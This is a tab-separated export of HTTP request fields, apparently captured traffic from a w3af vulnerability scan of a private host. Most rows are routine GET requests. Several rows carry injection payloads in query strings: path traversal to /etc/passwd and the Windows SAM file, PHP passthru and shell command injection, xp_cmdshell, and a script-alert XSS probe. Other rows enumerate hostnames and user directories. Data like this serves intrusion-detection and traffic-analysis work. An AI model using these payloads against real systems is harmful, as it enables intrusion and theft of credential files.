http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			w3af.org				/web
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			w3af.org				/web
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			w3af.org				/web
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			w3af.org				/web
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			w3af.org				/web
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			w3af.org				/web
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			w3af.org				/web
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			w3af.org				/web
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			w3af.org				/web
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			w3af.org				/web
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			w3af.org				/web
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			w3af.org				/web
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			w3af.org				/web
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			w3af.org				/web
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			w3af.org				/web
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			w3af.org				/web
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			w3af.org				/web
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			w3af.org				/web
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			w3af.org				/web/
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			w3af.org				/web
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/ewb		GET				HTTP/1.1																			w3af.org				/ewb
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			w3af.org				/web
*/*	gzip, deflate																keep-alive		6	6	text/plain						192.168.1.104															1	http://192.168.1.104/uyvEp		PUT				HTTP/1.1																			w3af.org				/uyvEp
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/		TRACE				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive		135	135	application/xml; charset="utf-8"						192.168.1.104															1	http://192.168.1.104/		SEARCH				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/		OPTIONS				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive		107	107	application/xml; charset="utf-8"						192.168.1.104															1	http://192.168.1.104/		PROPFIND				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/_vti_inf.html		GET				HTTP/1.1																			w3af.org				/_vti_inf.html
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/uyvEp		GET				HTTP/1.1																			w3af.org				/uyvEp
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web?ysNBMxi=ioF41XH		GET				HTTP/1.1																			w3af.org				/web?ysNBMxi=ioF41XH
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/		GET				HTTP/1.1																			w3af.org				/
																																										1			GET																							None				
																																										1			OPTIONS				HTTP/1.0																			None				/
																																										1			GET				HTTP/1.0																			None				/
																																										1			GET																							None				/
																																										1			GET				HTTP/1.0																			None				/a
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																IIhdreRwcRVFILmiWdgyIKknkEBwrQJKMCecfaSSDFEaxxBaOKNWtPOBzRdTvbZormjENCtjlVRLvedYGQCSpxKuhUNfeeugpcRuseaCwnsENUIXKHYsxZhgOSUWCPHCEKPUjLbELthtxtqPmepFQzyxiozrmQEDDKunRZVDjUBeeQajQXFEPWJjhSEyStUmHVudDZpEIZQalPNkQUqcRLPWhXgyfBnOISshXHvYzHXyncHLMsuOrqyipsctIxnWTgouyzncVXCMAGTauNIpXNakjaMRtiijQvxGlqcGkiCLfQvKbtNPRklmzdOhlJdhlgmbvAqyRZUeqJVJZClnNaONQuOAWHmaRNhhmRooMORosiIWAithBPkSoyYUEZmzBTKyucmMyiRNRrHMyzuwdXiGxuLPRJUUIyWjxeRwkDsAkKjfNpAPhseGyrlEYPaCczVPuAnMUPahodnOqqDLlHzjXQtEljNoVUUiNRNpokwPCTcUPxSEbPdCHMLmSandBxjsaGoezEsgRqKbADXXdWHqPoucTzYZsemDXRaXqprUnnJnoalTafzJyLPfaFgRzWWkYRAssSCkBvcQWecEpQbkHjWCBxOYXdxFvcmOBVPICmpyRDjTJXREpuhZYuxLuFkGTqGDUcWskbZisuRsSGwYjQgmsOaVPPVYwQpEbYXKXVvbBEHDNqbhJVNtfcojUGoRCWfBkuIrPbFhHPQAnwpkptjUGwzmodxemDuGQqhkGAEAJrsUVyHCKLQFFddCzEZtWLnEvjYNDYTvSKjYmeJJbuKHvmZJFbMYAjtGPBqzyKhDyxBuekcdgVIhXfTLCVyiuRDQDqjLnonaRKOUHKDYIEwaBSyLXaoiniJQkihFtyklNyIvMOwQFikRQYZMsaWyOjyuVlOsktuDgywJIrRwMgqGqITPsQObtvWOahvWOCRQsYDLnWvEMkvfFsmlhtgZyTTfIxHRSaQIGsXYLaQQpeBZaSAgwMFmbaZAGjqoLaAXBXfUTCDfZCuijViop			w3af.org				/web
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web?=PHPE9568F34-D428-11d2-A769-00AA001ACF42		GET				HTTP/1.1																			w3af.org				/web?=PHPE9568F34-D428-11d2-A769-00AA001ACF42
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web?=PHPE9568F36-D428-11d2-A769-00AA001ACF42		GET				HTTP/1.1																			w3af.org				/web?=PHPE9568F36-D428-11d2-A769-00AA001ACF42
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web?=PHPE9568F35-D428-11d2-A769-00AA001ACF42		GET				HTTP/1.1																			w3af.org				/web?=PHPE9568F35-D428-11d2-A769-00AA001ACF42
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000		GET				HTTP/1.1																			w3af.org				/web?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000
*/*	gzip, deflate																keep-alive										iDoNotExistPleaseGoAwayNowOrDie1ygC.com															1	http://iDoNotExistPleaseGoAwayNowOrDie1ygC.com/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																IIhdreRwcRVFILmiWdgyIKknkEBwrQJKMCecfaSSDFEaxxBaOKNWtPOBzRdTvbZormjENCtjlVRLvedYGQCSpxKuhUNfeeugpcRuseaCwnsENUIXKHYsxZhgOSUWCPHCEKPUjLbELthtxtqPmepFQzyxiozrmQEDDKunRZVDjUBeeQajQXFEPWJjhSEyStUmHVudDZpEIZQalPNkQUqcRLPWhXgyfBnOISshXHvYzHXyncHLMsuOrqyipsctIxnWTgouyzncVXCMAGTauNIpXNakjaMRtiijQvxGlqcGkiCLfQvKbtNPRklmzdOhlJdhlgmbvAqyRZUeqJVJZClnNaONQuOAWHmaRNhhmRooMORosiIWAithBPkSoyYUEZmzBTKyucmMyiRNRrHMyzuwdXiGxuLPRJUUIyWjxeRwkDsAkKjfNpAPhseGyrlEYPaCczVPuAnMUPahodnOqqDLlHzjXQtEljNoVUUiNRNpokwPCTcUPxSEbPdCHMLmSandBxjsaGoezEsgRqKbADXXdWHqPoucTzYZsemDXRaXqprUnnJnoalTafzJyLPfaFgRzWWkYRAssSCkBvcQWecEpQbkHjWCBxOYXdxFvcmOBVPICmpyRDjTJXREpuhZYuxLuFkGTqGDUcWskbZisuRsSGwYjQgmsOaVPPVYwQpEbYXKXVvbBEHDNqbhJVNtfcojUGoRCWfBkuIrPbFhHPQAnwpkptjUGwzmodxemDuGQqhkGAEAJrsUVyHCKLQFFddCzEZtWLnEvjYNDYTvSKjYmeJJbuKHvmZJFbMYAjtGPBqzyKhDyxBuekcdgVIhXfTLCVyiuRDQDqjLnonaRKOUHKDYIEwaBSyLXaoiniJQkihFtyklNyIvMOwQFikRQYZMsaWyOjyuVlOsktuDgywJIrRwMgqGqITPsQObtvWOahvWOCRQsYDLnWvEMkvfFsmlhtgZyTTfIxHRSaQIGsXYLaQQpeBZaSAgwMFmbaZAGjqoLaAXBXfUTCDfZCuijViop			w3af.org				/web
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/H57g0		GET				HTTP/1.1																			w3af.org				/H57g0
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web?ysNBMxi=.%2F..%2F..%2F..%2Fetc%2Fmotd%00html		GET				HTTP/1.1																			w3af.org				/web?ysNBMxi=.%2F..%2F..%2F..%2Fetc%2Fmotd%00html
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web?ysNBMxi=type%2Bc%3A%5Cwinnt%5Crepair%5Csam._		GET				HTTP/1.1																			w3af.org				/web?ysNBMxi=type%2Bc%3A%5Cwinnt%5Crepair%5Csam._
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web?ysNBMxi=..%2F..%2F..%2F..%2Fbin%2Fchgrp%20nobody%20%2Fetc%2Fshadow%7C		GET				HTTP/1.1																			w3af.org				/web?ysNBMxi=..%2F..%2F..%2F..%2Fbin%2Fchgrp%20nobody%20%2Fetc%2Fshadow%7C
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web?ysNBMxi=SELECT%20TOP%201%20name%20FROM%20sysusers		GET				HTTP/1.1																			w3af.org				/web?ysNBMxi=SELECT%20TOP%201%20name%20FROM%20sysusers
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web?ysNBMxi=..%2F..%2FWINNT%2Fsystem32%2Fcmd.exe%3Fdir%2Bc%3A%5C		GET				HTTP/1.1																			w3af.org				/web?ysNBMxi=..%2F..%2FWINNT%2Fsystem32%2Fcmd.exe%3Fdir%2Bc%3A%5C
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web?ysNBMxi=..%2F..%2F..%2F..%2Fetc%2Fpasswd		GET				HTTP/1.1																			w3af.org				/web?ysNBMxi=..%2F..%2F..%2F..%2Fetc%2Fpasswd
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web?ysNBMxi=%3C%3F%20passthru%28%22id%22%29%3B%3F%3E		GET				HTTP/1.1																			w3af.org				/web?ysNBMxi=%3C%3F%20passthru%28%22id%22%29%3B%3F%3E
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web?ysNBMxi=id%3Buname%20-a		GET				HTTP/1.1																			w3af.org				/web?ysNBMxi=id%3Buname%20-a
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web?ysNBMxi=exec%20master..xp_cmdshell%20dir		GET				HTTP/1.1																			w3af.org				/web?ysNBMxi=exec%20master..xp_cmdshell%20dir
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web?ysNBMxi=exec%20xp_cmdshell%20dir		GET				HTTP/1.1																			w3af.org				/web?ysNBMxi=exec%20xp_cmdshell%20dir
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web?ysNBMxi=%3Cscript%3Ealert%281%29%3C%2Fscript%3E		GET				HTTP/1.1																			w3af.org				/web?ysNBMxi=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web?ysNBMxi=ps%20-aux%3B		GET				HTTP/1.1																			w3af.org				/web?ysNBMxi=ps%20-aux%3B
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*	gzip,deflate	en-us,en;q=0.5									no-cache						keep-alive										192.168.1.104															1	http://192.168.1.104/		GET				HTTP/1.1																			Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3				/
*/*	gzip, deflate																keep-alive										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																IIhdreRwcRVFILmiWdgyIKknkEBwrQJKMCecfaSSDFEaxxBaOKNWtPOBzRdTvbZormjENCtjlVRLvedYGQCSpxKuhUNfeeugpcRuseaCwnsENUIXKHYsxZhgOSUWCPHCEKPUjLbELthtxtqPmepFQzyxiozrmQEDDKunRZVDjUBeeQajQXFEPWJjhSEyStUmHVudDZpEIZQalPNkQUqcRLPWhXgyfBnOISshXHvYzHXyncHLMsuOrqyipsctIxnWTgouyzncVXCMAGTauNIpXNakjaMRtiijQvxGlqcGkiCLfQvKbtNPRklmzdOhlJdhlgmbvAqyRZUeqJVJZClnNaONQuOAWHmaRNhhmRooMORosiIWAithBPkSoyYUEZmzBTKyucmMyiRNRrHMyzuwdXiGxuLPRJUUIyWjxeRwkDsAkKjfNpAPhseGyrlEYPaCczVPuAnMUPahodnOqqDLlHzjXQtEljNoVUUiNRNpokwPCTcUPxSEbPdCHMLmSandBxjsaGoezEsgRqKbADXXdWHqPoucTzYZsemDXRaXqprUnnJnoalTafzJyLPfaFgRzWWkYRAssSCkBvcQWecEpQbkHjWCBxOYXdxFvcmOBVPICmpyRDjTJXREpuhZYuxLuFkGTqGDUcWskbZisuRsSGwYjQgmsOaVPPVYwQpEbYXKXVvbBEHDNqbhJVNtfcojUGoRCWfBkuIrPbFhHPQAnwpkptjUGwzmodxemDuGQqhkGAEAJrsUVyHCKLQFFddCzEZtWLnEvjYNDYTvSKjYmeJJbuKHvmZJFbMYAjtGPBqzyKhDyxBuekcdgVIhXfTLCVyiuRDQDqjLnonaRKOUHKDYIEwaBSyLXaoiniJQkihFtyklNyIvMOwQFikRQYZMsaWyOjyuVlOsktuDgywJIrRwMgqGqITPsQObtvWOahvWOCRQsYDLnWvEMkvfFsmlhtgZyTTfIxHRSaQIGsXYLaQQpeBZaSAgwMFmbaZAGjqoLaAXBXfUTCDfZCuijViop			w3af.org				/web
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*	gzip,deflate	en-us,en;q=0.5									no-cache						keep-alive										192.168.1.104															1	http://192.168.1.104/		GET				HTTP/1.1																			Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3				/
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*	gzip,deflate	en-us,en;q=0.5									no-cache						keep-alive										192.168.1.104															1	http://192.168.1.104/		GET				HTTP/1.1																			Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3				/
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*	gzip,deflate	en-us,en;q=0.5									no-cache						keep-alive										192.168.1.104															1	http://192.168.1.104/		GET				HTTP/1.1																			Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3				/
																																										1			GET				HTTP/1.0																			None				/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
*/*	gzip, deflate																keep-alive										192.168.1.104									167						1	http://192.168.1.104/web		TRACE				HTTP/1.1																			w3af.org				/web
*/*	gzip, deflate																keep-alive										192.168.1.104									74						1	http://192.168.1.104/server-status		GET				HTTP/1.1																			w3af.org				/server-status
*/*	gzip, deflate																keep-alive										iDoNotExistPleaseGoAwayNowOrDieCnxx.192.168.1.104									88						1	http://iDoNotExistPleaseGoAwayNowOrDieCnxx.192.168.1.104/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										192.168.1.104									433					http://192.168.1.104/	1	http://192.168.1.104/~_w_3_a_f_/		GET				HTTP/1.1																			w3af.org				/~_w_3_a_f_/
*/*	gzip, deflate																keep-alive										extranet									445						1	http://extranet/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										extra									436						1	http://extra/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										test									285						1	http://test/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										test1									333						1	http://test1/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										old									46						1	http://old/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										intranet									151						1	http://intranet/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										intra									160						1	http://intra/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										admin									316						1	http://admin/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										new									18						1	http://new/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										webmail									137						1	http://webmail/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										console									458						1	http://console/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										adm									461						1	http://adm/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										ws									39						1	http://ws/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										services															1	http://services/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										corporate									25						1	http://corporate/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										mail									309						1	http://mail/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										webservice									302						1	http://webservice/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										apps									487						1	http://apps/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										private									485						1	http://private/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										hidden									453						1	http://hidden/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										safe									455						1	http://safe/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										secure									483						1	http://secure/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										public									205						1	http://public/		GET				HTTP/1.1																			w3af.org				/
*/*	gzip, deflate																keep-alive										192.168.1.104									526						1	http://192.168.1.104/sitemap.xml		GET				HTTP/1.1																			w3af.org				/sitemap.xml
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									524						1	http://192.168.1.104/~fetchmail/		GET				HTTP/1.1																			w3af.org				/~fetchmail/
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									537						1	http://192.168.1.104/Debian-exim/		GET				HTTP/1.1																			w3af.org				/Debian-exim/
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*	gzip,deflate	en-us,en;q=0.5									no-cache						keep-alive										192.168.1.104															1	http://192.168.1.104/		GET				HTTP/1.1																			Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3				/
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*	gzip,deflate	en-us,en;q=0.5									no-cache						keep-alive										192.168.1.104															1	http://192.168.1.104/		GET				HTTP/1.1																			Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3				/
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*	gzip,deflate	en-us,en;q=0.5									no-cache						keep-alive										192.168.1.104															1	http://192.168.1.104/		GET				HTTP/1.1																			Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3				/
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									392						1	http://192.168.1.104/smmsp/		GET				HTTP/1.1																			w3af.org				/smmsp/
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*	gzip,deflate	en-us,en;q=0.5									no-cache						keep-alive										192.168.1.104															1	http://192.168.1.104/		GET				HTTP/1.1																			Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3				/
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									607						1	http://192.168.1.104/debian-tor/		GET				HTTP/1.1																			w3af.org				/debian-tor/
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									557						1	http://192.168.1.104/~Debian-exim/		GET				HTTP/1.1																			w3af.org				/~Debian-exim/
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									338						1	http://192.168.1.104/~privoxy/		GET				HTTP/1.1																			w3af.org				/~privoxy/
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									529						1	http://192.168.1.104/logwatch/		GET				HTTP/1.1																			w3af.org				/logwatch/
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									390						1	http://192.168.1.104/~debian-tor/		GET				HTTP/1.1																			w3af.org				/~debian-tor/
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/snort/		GET				HTTP/1.1																			w3af.org				/snort/
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									511						1	http://192.168.1.104/~snort/		GET				HTTP/1.1																			w3af.org				/~snort/
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									362						1	http://192.168.1.104/~logwatch/		GET				HTTP/1.1																			w3af.org				/~logwatch/
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									465						1	http://192.168.1.104/~eximuser/		GET				HTTP/1.1																			w3af.org				/~eximuser/
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									619						1	http://192.168.1.104/eximuser/		GET				HTTP/1.1																			w3af.org				/eximuser/
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									377						1	http://192.168.1.104/privoxy/		GET				HTTP/1.1																			w3af.org				/privoxy/
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									644						1	http://192.168.1.104/~smmsp/		GET				HTTP/1.1																			w3af.org				/~smmsp/
*/*	gzip, deflate																keep-alive		0	0	application/x-www-form-urlencoded						192.168.1.104									474						1	http://192.168.1.104/~defang/		GET				HTTP/1.1																			w3af.org				/~defang/
